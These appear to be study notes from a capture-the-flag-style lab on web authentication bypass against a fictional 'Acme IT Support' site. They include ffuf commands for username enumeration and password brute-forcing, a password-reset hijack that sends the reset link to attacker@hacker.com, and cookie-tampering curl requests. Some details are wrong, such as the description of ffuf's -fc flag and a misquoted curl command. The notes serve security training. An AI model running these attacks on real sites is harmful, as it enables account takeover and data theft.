# Authentication Bypass
### Task 1 Brief
Common website authentication methods that can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.

### Task 2 Username Enumeration
A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.

Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website. (`http://<ip>/customers/signup`)

If you try entering the username **admin** and fill in the other form fields with fake information, you'll see we get the error **An account with user username already exists**. You can use this error to find usernames that actually exist.

`ffuf -w /Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://<ip>/customers/signup -mr "username already exists"`

This will return all the successful usernames that already exist. The `-mr` argument is the text on the page we are looking for to validate we've found a valid username.

### Task 3 Brute Force
Now using the custom list of usernames that are valid, we can attempt to brute force the login page.

Using this in conjunction with a password list, we can try multiple passwords with those users.

`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/...:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://<ip>/customers/login -fc 200`

`-fc` option is used to check for the HTTP status code of 200, meaning it was a successful login.

### Task 4 Logic Flaw
Sometimes authentication processes contain logic flaws. A logic flaw when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

##### Example
```scheme
	if (url.substr(0,6) === '/admin') {
		# code to check user is admin
	} else {
		# View page
	}
```

Because this is using the equal sign check, if someone goes to '/adMiN' page they may bypass this check.

##### Practice
The reset password function of the Acme IT Support website is at `http://<ip>/customers/reset`. The form is asking for an email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you'll receive an error message "Account not found from supplied email address".

For demonstration purposes, we'll use email address robert@acmeitsupport.thm which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we use the username robert as the username and press the Check username button, it will present a confirmation message that a password reset email will be sent to robert@acmeitsupport.thm.

We see that the email is sent as a GET parameter and the username is sent via POST request.

If we cURL the URL with the GET parameter and pass the POST data.

`curl 'http://<ip>/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'`

in the application, the user account retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`. This variable is an array that contains data received from the query string and POST data.

This means we can pass in another POST parameter data to choose where the email reset link is sent `'username=robert&email=attacker@hacker.com'`

### Task 5 Cookie Tampering
Examining and editing the cookies set by the Web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

##### Plain text
The contents of some cookies can be in plain text, and it's obvious what they do

`Set-Cookie: logged_in=true;Max-Age=3600;Path=/`
`Set-Cookie: admin=false;Max-Age=3600;Path=/`

First, we'll start just by requesting the target page.
`curl http://<ip>/cookie-test`

Another request, setting the loggin_in cookie to true, but admin to false
`curl -H 'Cookie: logged_in=true; admin=false" http://<ip>/cookie-test`



